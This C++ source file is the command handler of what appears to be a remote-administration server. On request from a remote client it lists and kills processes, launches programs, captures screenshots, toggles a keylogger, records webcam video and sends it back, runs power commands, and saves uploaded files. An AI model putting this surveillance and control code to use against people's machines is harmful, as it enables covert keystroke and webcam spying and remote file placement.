#include "CommandHandler.h"
#include <iostream>
#include <thread> 
#include "../Features/AppManager.cpp"
#include "../Features/Power.cpp"
#include "../Features/ScreenCap.cpp"
#include "../Features/Keylogger.cpp"
#include "../Features/Webcam.cpp"
#include "../Features/FileMgr.h"


using namespace std;
using json = nlohmann::json;

void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
    try {
        if (jsonMessage.find("PING") != string::npos) {
            server.SendFrame(json{{"type", "PONG"}}.dump());
            return; 
        }
        auto req = json::parse(jsonMessage);
        string type = req["type"];

        // --- TAB 1 & 2: APPLICATIONS & PROCESSES ---
        if (type == "GET_APPS") {
            cout << ">> Client request: Get Apps List" << endl;
            json apps = AppManager::GetRunningApps();
            
            server.SendFrame(json{
                {"type", "APP_LIST"},
                {"payload", apps}
            }.dump());
        }
        
        else if (type == "PROCESS_LIST") {
            cout << ">> Client request: Get Process List" << endl;
            json procs = AppManager::GetAllProcesses();
            
            server.SendFrame(json{
                {"type", "PROCESS_LIST"},
                {"payload", procs}
            }.dump());
        }

        else if (type == "KILL_APP") {
            int pid = req["payload"]["pid"];
            cout << ">> Client request: KILL PID " << pid << endl;
            
            AppManager::KillProcess(pid);
            server.SendFrame(json{{"type", "APP_LIST"}, {"payload", AppManager::GetRunningApps()}}.dump());
            server.SendFrame(json{{"type", "PROCESS_LIST"}, {"payload", AppManager::GetAllProcesses()}}.dump());
        }
        else if (type == "START_APP") {
            string path = req["payload"]["path"];
            cout << ">> Client request: START " << path << endl;
            AppManager::StartApp(path);
        }

        // --- TAB 3: SCREENSHOT ---
        else if (type == "CAPTURE_SCREEN") {
            cout << ">> Client request: Screenshot" << endl;
            string b64 = ScreenCapture::TakeScreenshot();
            
            server.SendFrame(json{
                {"type", "SCREENSHOT_DATA"},
                {"payload", { {"base64", b64} }}
            }.dump());
        }

        // --- TAB 4: KEYLOGGER ---
        else if (type == "KEYLOG_CONTROL") {
            string action = req["payload"]["action"];
            if (action == "START") {
                cout << ">> Keylogger: ENABLED" << endl;
                Keylogger::Start(server);
            } else {
                cout << ">> Keylogger: DISABLED" << endl;
                Keylogger::Stop();
            }
        }

        // --- TAB 5: WEBCAM ---
        else if (type == "RECORD_WEBCAM") {
            int duration = req["payload"]["duration"];
            cout << ">> Webcam: Recording for " << duration << "s..." << endl;
            
            server.SendFrame(json{
                {"type", "WEBCAM_STATUS"},
                {"payload", "PROCESSING"}
            }.dump());
            thread([&server, duration]() {
                string b64Video = WebcamMgr::RecordVideo(duration);
                
                if (!b64Video.empty()) {
                    server.SendFrame(json{
                        {"type", "WEBCAM_VIDEO"},
                        {"payload", { {"base64", b64Video} }}
                    }.dump());
                    cout << ">> Webcam: Sent video to client." << endl;
                } else {
                    cout << ">> Webcam: Error recording (Check ffmpeg.exe)" << endl;
                }
            }).detach(); 
        }

        // --- TAB 6: POWER ---
        else if (type == "SYSTEM_COMMAND") {
            string action = req["payload"]["action"];
            cout << ">> System Command: " << action << endl;
            PowerControl::Execute(action);
        }
        else if (type == "UPLOAD_FILE") {
            string fileName = req["payload"]["filename"];
            string b64Data = req["payload"]["base64"];

            cout << ">> [UPLOAD] Dang nhan file: " << fileName << "..." << endl;

            // Lưu file xuống ổ cứng (Cùng thư mục với file .exe)
            bool success = FileMgr::SaveFile(fileName, b64Data);

            // Gửi thông báo lại cho Client
            json response;
            response["type"] = "UPLOAD_STATUS";
            response["payload"] = {
                {"status", success ? "SUCCESS" : "FAILED"},
                {"filename", fileName}
            };
            server.SendFrame(response.dump());
        }
        
        else {
            cout << ">> Unknown command: " << type << endl;
        }
    }
    catch (exception& e) {
        cout << "!! JSON Processing Error: " << e.what() << endl;
    }
}